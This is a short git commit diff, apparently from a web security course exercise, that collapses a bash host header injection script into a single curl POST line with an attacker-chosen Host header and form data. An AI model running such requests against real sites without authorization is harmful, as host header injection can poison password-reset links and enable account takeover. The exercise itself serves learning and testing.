85a4a0d88cb77c37a1cd22bd47d5ccf37c298066
ulvialv <ulvialiyevgithub@gmail.com>
2026-01-16 10:38:52 +0000

    asd

--- web_application_security/0x00_web_fundamentals/1-host_header_injection.sh
+++ web_application_security/0x00_web_fundamentals/1-host_header_injection.sh
@@ -1,16 +1,2 @@
 #!/bin/bash
-
-# Check arguments
-if [ "$#" -ne 3 ]; then
-    echo "Usage: $0 <NEW_HOST> <TARGET_URL> <FORM_DATA>"
-    exit 1
-fi
-
-NEW_HOST="$1"
-TARGET_URL="$2"
-FORM_DATA="$3"
-
-curl -s -X POST "$TARGET_URL" \
-  -H "Host: $NEW_HOST" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  --data "$FORM_DATA"
+curl -s -X POST "$2" -H "Host: $1" -H "Content-Type: application/x-www-form-urlencoded" --data "$3"
